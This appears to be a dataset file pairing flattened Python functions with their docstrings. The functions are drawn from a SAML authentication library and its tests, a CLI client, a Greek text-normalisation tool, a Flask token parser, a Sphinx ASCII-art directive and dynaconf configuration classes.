1	def get_last_error_reason(self): return self.__error_reason	Returns the reason for the last error :returns: Reason of the last error :rtype: None | string
1	def get_last_authn_contexts(self): return self.__last_authn_contexts	:returns: The list of authentication contexts sent in the last SAML Response. :rtype: list
1	def login(self, return_to=None, force_authn=False, is_passive=False, set_nameid_policy=True, name_id_value_req=None): authn_request = OneLogin_Saml2_Authn_Request(self.__settings, force_authn, is_passive, set_nameid_policy, name_id_value_req) self.__last_request = authn_request.get_xml() self.__last_request_id = authn_request.get_id() saml_request = authn_request.get_request() parameters = {'SAMLRequest': saml_request} if return_to is not None: parameters['RelayState'] = return_to else: parameters['RelayState'] = OneLogin_Saml2_Utils.get_self_url_no_query(self.__request_data) security = self.__settings.get_security_data() if security.get('authnRequestsSigned', False): self.add_request_signature(parameters, security['signatureAlgorithm']) return self.redirect_to(self.get_sso_url(), parameters)	Initiates the SSO process. :param return_to: Optional argument. The target URL the user should be redirected to after login. :type return_to: string :param force_authn: Optional argument. When true the AuthNRequest will set the ForceAuthn='true'. :type force_authn: bool :param is_passive: Optional argument. When true the AuthNRequest will set the Ispassive='true'. :type is_passive: bool :param set_nameid_policy: Optional argument. When true the AuthNRequest will set a nameIdPolicy element. :type set_nameid_policy: bool :param name_id_value_req: Optional argument. Indicates to the IdP the subject that should be authenticated :type name_id_value_req: string :returns: Redirection URL :rtype: string
1	def logout(self, return_to=None, name_id=None, session_index=None, nq=None, name_id_format=None): slo_url = self.get_slo_url() if slo_url is None: raise OneLogin_Saml2_Error( 'The IdP does not support Single Log Out', OneLogin_Saml2_Error.SAML_SINGLE_LOGOUT_NOT_SUPPORTED ) if name_id is None and self.__nameid is not None: name_id = self.__nameid if name_id_format is None and self.__nameid_format is not None: name_id_format = self.__nameid_format logout_request = OneLogin_Saml2_Logout_Request( self.__settings, name_id=name_id, session_index=session_index, nq=nq, name_id_format=name_id_format ) self.__last_request = logout_request.get_xml() self.__last_request_id = logout_request.id parameters = {'SAMLRequest': logout_request.get_request()} if return_to is not None: parameters['RelayState'] = return_to else: parameters['RelayState'] = OneLogin_Saml2_Utils.get_self_url_no_query(self.__request_data) security = self.__settings.get_security_data() if security.get('logoutRequestSigned', False): self.add_request_signature(parameters, security['signatureAlgorithm']) return self.redirect_to(slo_url, parameters)	Initiates the SLO process. :param return_to: Optional argument. The target URL the user should be redirected to after logout. :type return_to: string :param name_id: The NameID that will be set in the LogoutRequest. :type name_id: string :param session_index: SessionIndex that identifies the session of the user. :type session_index: string :param nq: IDP Name Qualifier :type: string :param name_id_format: The NameID Format that will be set in the LogoutRequest. :type: string :returns: Redirection URL
1	def get_sso_url(self): idp_data = self.__settings.get_idp_data() return idp_data['singleSignOnService']['url']	Gets the SSO URL. :returns: An URL, the SSO endpoint of the IdP :rtype: string
1	def get_slo_url(self): idp_data = self.__settings.get_idp_data() if 'url' in idp_data['singleLogoutService']: return idp_data['singleLogoutService']['url']	Gets the SLO URL. :returns: An URL, the SLO endpoint of the IdP :rtype: string
1	def add_request_signature(self, request_data, sign_algorithm=OneLogin_Saml2_Constants.RSA_SHA1): return self.__build_signature(request_data, 'SAMLRequest', sign_algorithm)	Builds the Signature of the SAML Request. :param request_data: The Request parameters :type request_data: dict :param sign_algorithm: Signature algorithm method :type sign_algorithm: string
1	def add_response_signature(self, response_data, sign_algorithm=OneLogin_Saml2_Constants.RSA_SHA1): return self.__build_signature(response_data, 'SAMLResponse', sign_algorithm)	Builds the Signature of the SAML Response. :param response_data: The Response parameters :type response_data: dict :param sign_algorithm: Signature algorithm method :type sign_algorithm: string
1	def validate_request_signature(self, request_data): return self.__validate_signature(request_data, 'SAMLRequest')	Validate Request Signature :param request_data: The Request data :type request_data: dict
1	def validate_response_signature(self, request_data): return self.__validate_signature(request_data, 'SAMLResponse')	Validate Response Signature :param request_data: The Request data :type request_data: dict
1	def get_last_response_xml(self, pretty_print_if_possible=False): response = None if self.__last_response is not None: if isinstance(self.__last_response, compat.str_type): response = self.__last_response else: response = tostring(self.__last_response, encoding='unicode', pretty_print=pretty_print_if_possible) return response	Retrieves the raw XML (decrypted) of the last SAML response, or the last Logout Response generated or processed :returns: SAML response XML :rtype: string|None
1	def get_last_request_xml(self): return self.__last_request or None	Retrieves the raw XML sent in the last SAML request :returns: SAML request XML :rtype: string|None
1	def __build_sign_query(saml_data, relay_state, algorithm, saml_type, lowercase_urlencoding=False): sign_data = ['%s=%s' % (saml_type, OneLogin_Saml2_Utils.escape_url(saml_data, lowercase_urlencoding))] if relay_state is not None: sign_data.append('RelayState=%s' % OneLogin_Saml2_Utils.escape_url(relay_state, lowercase_urlencoding)) sign_data.append('SigAlg=%s' % OneLogin_Saml2_Utils.escape_url(algorithm, lowercase_urlencoding)) return '&'.join(sign_data)	Build sign query :param saml_data: The Request data :type saml_data: str :param relay_state: The Relay State :type relay_state: str :param algorithm: The Signature Algorithm :type algorithm: str :param saml_type: The target URL the user should be redirected to :type saml_type: string SAMLRequest | SAMLResponse :param lowercase_urlencoding: lowercase or no :type lowercase_urlencoding: boolean
1	def __build_signature(self, data, saml_type, sign_algorithm=OneLogin_Saml2_Constants.RSA_SHA1): assert saml_type in ('SAMLRequest', 'SAMLResponse') key = self.get_settings().get_sp_key() if not key: raise OneLogin_Saml2_Error( "Trying to sign the %s but can't load the SP private key." % saml_type, OneLogin_Saml2_Error.PRIVATE_KEY_NOT_FOUND ) msg = self.__build_sign_query(data[saml_type], data.get('RelayState', None), sign_algorithm, saml_type) sign_algorithm_transform_map = { OneLogin_Saml2_Constants.DSA_SHA1: xmlsec.Transform.DSA_SHA1, OneLogin_Saml2_Constants.RSA_SHA1: xmlsec.Transform.RSA_SHA1, OneLogin_Saml2_Constants.RSA_SHA256: xmlsec.Transform.RSA_SHA256, OneLogin_Saml2_Constants.RSA_SHA384: xmlsec.Transform.RSA_SHA384, OneLogin_Saml2_Constants.RSA_SHA512: xmlsec.Transform.RSA_SHA512 } sign_algorithm_transform = sign_algorithm_transform_map.get(sign_algorithm, xmlsec.Transform.RSA_SHA1) signature = OneLogin_Saml2_Utils.sign_binary(msg, key, sign_algorithm_transform, self.__settings.is_debug_active()) data['Signature'] = OneLogin_Saml2_Utils.b64encode(signature) data['SigAlg'] = sign_algorithm	Builds the Signature :param data: The Request data :type data: dict :param saml_type: The target URL the user should be redirected to :type saml_type: string SAMLRequest | SAMLResponse :param sign_algorithm: Signature algorithm method :type sign_algorithm: string
1	def testGetSettings(self): settings_info = self.loadSettingsJSON() settings = OneLogin_Saml2_Settings(settings_info) auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) auth_settings = auth.get_settings() self.assertEqual(settings.get_sp_data(), auth_settings.get_sp_data())	Tests the get_settings method of the OneLogin_Saml2_Auth class Build a OneLogin_Saml2_Settings object with a setting array and compare the value returned from the method of the auth object
1	def testGetSSOurl(self): settings_info = self.loadSettingsJSON() auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) sso_url = settings_info['idp']['singleSignOnService']['url'] self.assertEqual(auth.get_sso_url(), sso_url)	Tests the get_sso_url method of the OneLogin_Saml2_Auth class
1	def testGetSLOurl(self): settings_info = self.loadSettingsJSON() auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) slo_url = settings_info['idp']['singleLogoutService']['url'] self.assertEqual(auth.get_slo_url(), slo_url)	Tests the get_slo_url method of the OneLogin_Saml2_Auth class
1	def testGetSessionIndex(self): settings_info = self.loadSettingsJSON() auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) self.assertIsNone(auth.get_session_index()) request_data = self.get_request() message = self.file_contents(join(self.data_path, 'responses', 'valid_response.xml.base64')) del request_data['get_data'] request_data['post_data'] = { 'SAMLResponse': message } auth2 = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) self.assertIsNone(auth2.get_session_index()) auth2.process_response() self.assertEqual('_6273d77b8cde0c333ec79d22a9fa0003b9fe2d75cb', auth2.get_session_index())	Tests the get_session_index method of the OneLogin_Saml2_Auth class
1	def testGetSessionExpiration(self): settings_info = self.loadSettingsJSON() auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) self.assertIsNone(auth.get_session_expiration()) request_data = self.get_request() message = self.file_contents(join(self.data_path, 'responses', 'valid_response.xml.base64')) del request_data['get_data'] request_data['post_data'] = { 'SAMLResponse': message } auth2 = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) self.assertIsNone(auth2.get_session_expiration()) auth2.process_response() self.assertEqual(2655106621, auth2.get_session_expiration())	Tests the get_session_expiration method of the OneLogin_Saml2_Auth class
1	def testGetLastErrorReason(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'responses', 'response1.xml.base64')) del request_data['get_data'] request_data['post_data'] = { 'SAMLResponse': message } auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.process_response() self.assertEqual(auth.get_last_error_reason(), 'Signature validation failed. SAML Response rejected')	Tests the get_last_error_reason method of the OneLogin_Saml2_Auth class Case Invalid Response
1	def testProcessNoResponse(self): auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=self.loadSettingsJSON()) with self.assertRaisesRegex(OneLogin_Saml2_Error, 'SAML Response not found'): auth.process_response() self.assertEqual(auth.get_errors(), ['invalid_binding'])	Tests the process_response method of the OneLogin_Saml2_Auth class Case No Response, An exception is throw
1	def testProcessResponseInvalid(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'responses', 'response1.xml.base64')) del request_data['get_data'] request_data['post_data'] = { 'SAMLResponse': message } auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.process_response() self.assertFalse(auth.is_authenticated()) self.assertEqual(len(auth.get_attributes()), 0) self.assertEqual(auth.get_nameid(), None) self.assertEqual(auth.get_attribute('uid'), None) self.assertEqual(auth.get_errors(), ['invalid_response'])	Tests the process_response method of the OneLogin_Saml2_Auth class Case Invalid Response, After processing the response the user is not authenticated, attributes are notreturned, no nameID and the error array is not empty, contains 'invalid_response
1	def testProcessResponseValid(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'responses', 'valid_response.xml.base64')) del request_data['get_data'] request_data['post_data'] = { 'SAMLResponse': message } auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.process_response() self.assertTrue(auth.is_authenticated()) self.assertEqual(len(auth.get_errors()), 0) self.assertEqual('492882615acf31c8096b627245d76ae53036c090', auth.get_nameid()) attributes = auth.get_attributes() self.assertNotEqual(len(attributes), 0) self.assertEqual(auth.get_attribute('mail'), attributes['mail']) session_index = auth.get_session_index() self.assertEqual('_6273d77b8cde0c333ec79d22a9fa0003b9fe2d75cb', session_index)	Tests the process_response method of the OneLogin_Saml2_Auth class Case Valid Response, After processing the response the user is authenticated, attributes are returned, also has a nameID and the error array is empty
1	def testRedirectTo(self): request_data = self.get_request() relay_state = 'http://sp.example.com' request_data['get_data']['RelayState'] = relay_state auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) target_url = auth.redirect_to() self.assertEqual(target_url, relay_state)	Tests the redirect_to method of the OneLogin_Saml2_Auth class (phpunit raises an exception when a redirect is executed, the exception is catched and we check that the targetURL is correct) Case redirect without url parameter
1	def testProcessNoSLO(self): auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=self.loadSettingsJSON()) with self.assertRaisesRegex(OneLogin_Saml2_Error, 'SAML LogoutRequest/LogoutResponse not found'): auth.process_slo(True) self.assertEqual(auth.get_errors(), ['invalid_binding'])	Tests the process_slo method of the OneLogin_Saml2_Auth class Case No Message, An exception is throw
1	def testProcessSLOResponseInvalid(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_responses', 'logout_response_deflated.xml.base64')) request_data['get_data']['SAMLResponse'] = message auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.process_slo(True) self.assertEqual(len(auth.get_errors()), 0) auth.set_strict(True) auth.process_slo(True) self.assertEqual(auth.get_errors(), ['invalid_logout_response']) auth.set_strict(False) auth.process_slo(True) self.assertEqual(len(auth.get_errors()), 0)	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Invalid Logout Response
1	def testProcessSLOResponseNoSucess(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_responses', 'invalids', 'status_code_responder.xml.base64')) plain_message = compat.to_string(OneLogin_Saml2_Utils.decode_base64_and_inflate(message)) current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data) plain_message = plain_message.replace('http://stuff.com/endpoints/endpoints/sls.php', current_url) message = OneLogin_Saml2_Utils.deflate_and_base64_encode(plain_message) request_data['get_data']['SAMLResponse'] = message auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.set_strict(True) auth.process_slo(True) self.assertEqual(auth.get_errors(), ['logout_not_success'])	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Logout Response not sucess
1	def testProcessSLOResponseValid(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_responses', 'logout_response_deflated.xml.base64')) plain_message = compat.to_string(OneLogin_Saml2_Utils.decode_base64_and_inflate(message)) current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data) plain_message = plain_message.replace('http://stuff.com/endpoints/endpoints/sls.php', current_url) message = OneLogin_Saml2_Utils.deflate_and_base64_encode(plain_message) request_data['get_data']['SAMLResponse'] = message auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) } auth.set_strict(True) auth.process_slo(True) self.assertEqual(len(auth.get_errors()), 0)	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Valid Logout Response
1	def testProcessSLORequestNotOnOrAfterFailed(self): request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_requests', 'invalids', 'not_after_failed.xml.base64')) plain_message = compat.to_string(OneLogin_Saml2_Utils.decode_base64_and_inflate(message)) current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data) plain_message = plain_message.replace('http://stuff.com/endpoints/endpoints/sls.php', current_url) message = OneLogin_Saml2_Utils.deflate_and_base64_encode(plain_message) request_data['get_data']['SAMLRequest'] = message auth = OneLogin_Saml2_Auth(request_data, old_settings=self.loadSettingsJSON()) auth.set_strict(True) auth.process_slo(True) self.assertEqual(auth.get_errors(), ['invalid_logout_request'])	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Logout Request NotOnOrAfter failed
1	def testProcessSLORequestDeletingSession(self): settings_info = self.loadSettingsJSON() request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_requests', 'logout_request_deflated.xml.base64')) plain_message = compat.to_string(OneLogin_Saml2_Utils.decode_base64_and_inflate(message)) current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data) plain_message = plain_message.replace('http://stuff.com/endpoints/endpoints/sls.php', current_url) message = OneLogin_Saml2_Utils.deflate_and_base64_encode(plain_message) request_data['get_data']['SAMLRequest'] = message } auth = OneLogin_Saml2_Auth(request_data, old_settings=settings_info) auth.set_strict(True) target_url = auth.process_slo(True) parsed_query = parse_qs(urlparse(target_url)[4]) slo_url = settings_info['idp']['singleLogoutService']['url'] self.assertIn(slo_url, target_url) self.assertIn('SAMLResponse', parsed_query) auth.set_strict(True) target_url_2 = auth.process_slo(True) target_url_2 = auth.process_slo(True) parsed_query_2 = parse_qs(urlparse(target_url_2)[4]) slo_url = settings_info['idp']['singleLogoutService']['url'] self.assertIn(slo_url, target_url_2) self.assertIn('SAMLResponse', parsed_query_2)	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Valid Logout Request, validating that the local session is deleted, a LogoutResponse is created and a redirection executed
1	def testProcessSLORequestSignedResponse(self): settings_info = self.loadSettingsJSON() settings_info['security']['logoutResponseSigned'] = True request_data = self.get_request() message = self.file_contents(join(self.data_path, 'logout_requests', 'logout_request_deflated.xml.base64')) plain_message = compat.to_string(OneLogin_Saml2_Utils.decode_base64_and_inflate(message)) current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data) plain_message = plain_message.replace('http://stuff.com/endpoints/endpoints/sls.php', current_url) message = OneLogin_Saml2_Utils.deflate_and_base64_encode(plain_message) request_data['get_data']['SAMLRequest'] = message request_data['get_data']['RelayState'] = 'http://relaystate.com' auth = OneLogin_Saml2_Auth(request_data, old_settings=settings_info) auth.set_strict(True) target_url = auth.process_slo(False) parsed_query = parse_qs(urlparse(target_url)[4]) slo_url = settings_info['idp']['singleLogoutService']['url'] self.assertIn(slo_url, target_url) self.assertIn('SAMLResponse', parsed_query) self.assertIn('RelayState', parsed_query) self.assertIn('SigAlg', parsed_query) self.assertIn('Signature', parsed_query) self.assertIn('http://relaystate.com', parsed_query['RelayState']) self.assertIn(OneLogin_Saml2_Constants.RSA_SHA1, parsed_query['SigAlg'])	Tests the process_slo method of the OneLogin_Saml2_Auth class Case Valid Logout Request, validating the relayState, a signed LogoutResponse is created and a redirection executed
1	def testLogin(self): settings_info = self.loadSettingsJSON() request_data = self.get_request() auth = OneLogin_Saml2_Auth(request_data, old_settings=settings_info) target_url = auth.login() parsed_query = parse_qs(urlparse(target_url)[4]) sso_url = settings_info['idp']['singleSignOnService']['url'] self.assertIn(sso_url, target_url) self.assertIn('SAMLRequest', parsed_query) self.assertIn('RelayState', parsed_query) hostname = OneLogin_Saml2_Utils.get_self_host(request_data) self.assertIn(u'http://%s/index.html' % hostname, parsed_query['RelayState'])	Tests the login method of the OneLogin_Saml2_Auth class Case Login with no parameters. An AuthnRequest is built an redirect executed
1	def testLoginWithRelayState(self): settings_info = self.loadSettingsJSON() auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) relay_state = 'http://sp.example.com' target_url = auth.login(relay_state) parsed_query = parse_qs(urlparse(target_url)[4]) sso_url = settings_info['idp']['singleSignOnService']['url'] self.assertIn(sso_url, target_url) self.assertIn('SAMLRequest', parsed_query) self.assertIn('RelayState', parsed_query) self.assertIn(relay_state, parsed_query['RelayState'])	Tests the login method of the OneLogin_Saml2_Auth class Case Login with relayState. An AuthnRequest is built with a the RelayState in the assertion is built and redirect executed
1	def testLoginSigned(self): settings_info = self.loadSettingsJSON() settings_info['security']['authnRequestsSigned'] = True auth = OneLogin_Saml2_Auth(self.get_request(), old_settings=settings_info) return_to = u'http://example.com/returnto' target_url = auth.login(return_to) parsed_query = parse_qs(urlparse(target_url)[4]) sso_url = settings_info['idp']['singleSignOnService']['url'] self.assertIn(sso_url, target_url) self.assertIn('SAMLRequest', parsed_query) self.assertIn('RelayState', parsed_query) self.assertIn('SigAlg', parsed_query) self.assertIn('Signature', parsed_query) self.assertIn(return_to, parsed_query['RelayState']) self.assertIn(OneLogin_Saml2_Constants.RSA_SHA1, parsed_query['SigAlg'])	Tests the login method of the OneLogin_Saml2_Auth class Case Login signed. An AuthnRequest signed is built an redirect executed
1	def __get_context_for_path(self, path, context_search): temp_context = context_search if path: path_arr = path.split('/') for p in path_arr: if p in temp_context: temp_context = temp_context[p] else: id_keys = [x for x in temp_context.keys() if '{' in x] if id_keys: temp_context = temp_context[id_keys[0]] else: return None return temp_context	This method searches for path in the passed context
1	def __get_completions_for_partial_path(self, path, context_search, start=False): path_arr = path.split('/') temp_context = context_search completions = [] for p in path_arr[:-1]: key = self.__get_id_key(p) if key in temp_context: temp_context = temp_context[key] else: return [] last_element = path_arr[len(path_arr)-1] prefix = '/'.join(path_arr[:-1]) if prefix: prefix += '/' if start: prefix = '/' + prefix for k in temp_context: if k.startswith(last_element): completions.append(prefix + k) return completions	This method returns partial path completions that are used for 'tab' command results
1	def __get_cookie(self): cookie = '' cf_path = os.path.join(ConfigUtil.COOKIE_DIR_ABS_PATH, COOKIE_FILE_NAME) if os.path.isfile(cf_path): with open(cf_path, 'r') as f: cookie = f.read() if not cookie: raise Exception("Cookie file not found. Login first") return cookie	This method reads cookie from file and return
1	def __read_payload_file(self, fname): payload = None if os.path.isfile(fname): with open(fname, 'r') as f: payload = f.read() if not payload: raise Exception("Payload file not found") return payload	This method reads the passed file and return its content
1	def __print_bulk_response(self, response_text): response_json = json.loads(response_text) if response_json and response_json['id']: print('\n'.join(response_json['id'])) print('')	This method prints 'bulk' API response
1	def __print_get_all_response(self, response_text): response_json = json.loads(response_text) if response_json: ids = list() for k, v in response_json.items(): for item in v: if 'id' in item: ids.append(item['id']) elif 'op_id' in item: ids.append(item['op_id']) else: ids.append(item) break if ids: print('\n'.join(ids))	This method parses passed response and prints ids
1	def __print_ll_response(self, response_text): response_json = json.loads(response_text) if response_json: table = [('ID', 'NAME')] for k, v in response_json.items(): for item in v: if 'id' in item: table.append((item['id'], item['name'])) elif 'op_id' in item: table.append((item['op_id'], item['name'])) else: table.append((item, '')) break CommonUtil.print_table(table) print(' ')	This method prints ids and names
1	class NLTKTokenizer(WordTokenizer): def __init__(self, language): self.language = language def tokenize(self, string): return nltk_tokenize_words(string) def processUnicodeDecomposition(string, *functions):	A wrapper for the `nltk_tokenize_words` function that inherits from the cltk.tokenize.word.WordTokenizer class. This could be expanded to implement some special tokenization for Greek if needed.
1	def processUnicodeDecomposition(string, *functions): decomposition = normalize('NFD', string) for function in functions: decomposition = function(decomposition) return normalize('NFC', decomposition)	Apply all functions in arguments to the canonicial decomposition of the unicode string `string` (i.e. with combining characters such as accents separated from the characters they combine with). Parameters: string (str): a Unicode string *functions (List[Callable]): variable length list of functions Returns: (str): the canonical normalization of `string` after each function in `*functions` has been applied to its decomposition
1	def removeMacrons(string): return regex.sub('\u0304', '', string)	Removes the macrons from any macron-ed characters in a string. Parameters: string (str): the string whose macrons are to be removed macrons must be separated as combining characters Returns: (str): `string` without any macrons
1	def removeDiareses(string): return regex.sub('\u0308', '', string)	Removes any diareses in string. Parameters: string (str): the string whose diareses are to be removed diareses must be separated as combining characters Returns: (str): `string` without any diareses
1	def get_token_auth_header(): auth = request.headers.get("Authorization", None) if not auth: abort(401, 'Authorization header is expected') parts = auth.split() if parts[0].lower() != "bearer": abort(401,'Authorization header must start with Bearer') elif len(parts) == 1: abort(401, 'Invalid header, token not found') elif len(parts) > 2: abort(401,'Authorization header must be in the form of "Bearer token"') token = parts[1] return token	Obtains the Access Token from the Authorization Header
1	def claim_func(field, data): if 'coverage' in data: return VulnerabilitySummary elif 'tests' in data: return ObservatoryScore elif 'findings' in data: return DastVulnerabilities	figure out which schema to use for the 'details' field
1	class Aafig(directives.images.Image): has_content = True required_arguments = 0 optional_arguments = 0 final_argument_whitespace = False own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = float, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): text = '\n'.join(self.content) aafig_options = dict() image_attrs = dict() own_options_keys = self.own_option_spec.keys() + ['scale'] for (k, v) in self.options.items(): if k in own_options_keys: if v is None: v = True if k == 'scale': v = float(v) / 100 aafig_options[k] = v del self.options[k] self.arguments = [get_basename(text, aafig_options)] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] aafig_node = aafig(text, image_node, **dict(options=aafig_options)) return [aafig_node] def render_aafigure(self, text, options):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	class AafigDirective(directives.images.Image): has_content = True required_arguments = 0 optional_arguments = 0 final_argument_whitespace = False own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = float, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): aafig_options = dict() image_attrs = dict() own_options_keys = self.own_option_spec.keys() + ['scale'] for (k, v) in self.options.items(): if k in own_options_keys: if v is None: v = True if k == 'scale': v = float(v) / 100 aafig_options[k] = v del self.options[k] self.arguments = [''] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] text = '\n'.join(self.content) pending_node = nodes.pending(AafigTransform, rawsource=text) pending_node.details.update(dict( image_node = image_node, aafigure_options = aafig_options, )) self.state_machine.document.note_pending(pending_node) return [pending_node] def render_aafigure(self, text, options):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	class AafigDirective(directives.images.Image): has_content = True required_arguments = 0 own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = directives.nonnegative_int, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): aafig_options = dict() own_options_keys = list(self.own_option_spec.keys()) + ['scale'] options_copy = list(self.options.items()) for (k, v) in options_copy: if k in own_options_keys: if v is None: v = True if k == 'scale' or k == 'aspect': v = float(v) / 100.0 aafig_options[k] = v del self.options[k] self.arguments = [''] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] text = '\n'.join(self.content) image_node.aafig = dict(options=aafig_options, text=text) return [image_node] def render_aafig_images(app, doctree):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	file_reader, string_reader): self.obj = obj self.env = env or obj.current_env self.identifier = identifier self.extensions = extensions self.file_reader = file_reader self.string_reader = string_reader	Instantiates a loader for different sources
1	class Aafig(directives.images.Image): has_content = True required_arguments = 0 optional_arguments = 0 final_argument_whitespace = False own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = float, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): text = '\n'.join(self.content) aafig_options = dict() image_attrs = dict() own_options_keys = self.own_option_spec.keys() + ['scale'] for (k, v) in self.options.items(): if k in own_options_keys: if v is None: v = True if k == 'scale': v = float(v) / 100 aafig_options[k] = v del self.options[k] self.arguments = [get_basename(text, aafig_options)] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] aafig_node = aafig(text, image_node, **dict(options=aafig_options)) return [aafig_node] def render_aafigure(self, text, options):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	class AafigDirective(directives.images.Image): has_content = True required_arguments = 0 optional_arguments = 0 final_argument_whitespace = False own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = float, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): aafig_options = dict() image_attrs = dict() own_options_keys = self.own_option_spec.keys() + ['scale'] for (k, v) in self.options.items(): if k in own_options_keys: if v is None: v = True if k == 'scale': v = float(v) / 100 aafig_options[k] = v del self.options[k] self.arguments = [''] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] text = '\n'.join(self.content) pending_node = nodes.pending(AafigTransform, rawsource=text) pending_node.details.update(dict( image_node = image_node, aafigure_options = aafig_options, )) self.state_machine.document.note_pending(pending_node) return [pending_node] def render_aafigure(self, text, options):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	class AafigDirective(directives.images.Image): has_content = True required_arguments = 0 own_option_spec = dict( line_width = float, background = str, foreground = str, fill = str, aspect = directives.nonnegative_int, textual = directives.flag, proportional = directives.flag, ) option_spec = directives.images.Image.option_spec.copy() option_spec.update(own_option_spec) def run(self): aafig_options = dict() own_options_keys = list(self.own_option_spec.keys()) + ['scale'] options_copy = list(self.options.items()) for (k, v) in options_copy: if k in own_options_keys: if v is None: v = True if k == 'scale' or k == 'aspect': v = float(v) / 100.0 aafig_options[k] = v del self.options[k] self.arguments = [''] (image_node,) = directives.images.Image.run(self) if isinstance(image_node, nodes.system_message): return [image_node] text = '\n'.join(self.content) image_node.aafig = dict(options=aafig_options, text=text) return [image_node] def render_aafig_images(app, doctree):	Directive to insert an ASCII art figure to be rendered by aafigure.
1	file_reader, string_reader): self.obj = obj self.env = env or obj.current_env self.identifier = identifier self.extensions = extensions self.file_reader = file_reader self.string_reader = string_reader	Instantiates a loader for different sources
1	def load(self, filename=None, key=None, silent=True): filename = filename or self.obj.get(self.identifier.upper()) if not filename: return if not isinstance(filename, (list, tuple)): split_files = filename.split(',') if all([f.endswith(self.extensions) for f in split_files]): files = split_files else: files = [filename] else: files = filename env_list = [self.obj.get('DEFAULT_ENV_FOR_DYNACONF')] global_env = self.obj.get('GLOBAL_ENV_FOR_DYNACONF') if global_env not in env_list: env_list.append(global_env) if self.env not in env_list: env_list.append(self.env) env_list.append('GLOBAL') self._read(files, env_list, silent, key)	Reads and loads in to `self.obj` a single key or all keys from source :param filename: Optional filename to load :param key: if provided load a single key :param silent: if load erros should be silenced
1	class DynaBox(Box): def __getattr__(self, item, *args, **kwargs): try: return super(DynaBox, self).__getattr__(item, *args, **kwargs) except (AttributeError, KeyError): n_item = item.lower() if item.isupper() else item.upper() return super(DynaBox, self).__getattr__(n_item, *args, **kwargs) def __getitem__(self, item, *args, **kwargs): try: return super(DynaBox, self).__getitem__(item, *args, **kwargs) except (AttributeError, KeyError): n_item = item.lower() if item.isupper() else item.upper() return super(DynaBox, self).__getitem__(n_item, *args, **kwargs) def __copy__(self): return self.__class__(super(Box, self).copy()) def copy(self): return self.__class__(super(Box, self).copy()) def get(self, item, default=None, *args, **kwargs): value = super(DynaBox, self).get(item, default, *args, **kwargs) if value is None or value == default: n_item = item.lower() if item.isupper() else item.upper() value = super(DynaBox, self).get(n_item, default, *args, **kwargs) return value	Specialized Box for dynaconf it allows items/attrs to be found both in upper or lower case
1	def get(self, key, default=None): return self._settings.get(key, Config.get(self, key, default))	Gets config from dynaconf variables if variables does not exists in dynaconf try getting from `app.config` to support runtime settings.
1	def __getitem__(self, key): return self.get(key)	Flask templates always expects a None when key is not found in config
1	def __getattr__(self, name): try: return getattr(self._settings, name) except AttributeError: return self[name]	First try to get value from dynaconf then from Flask
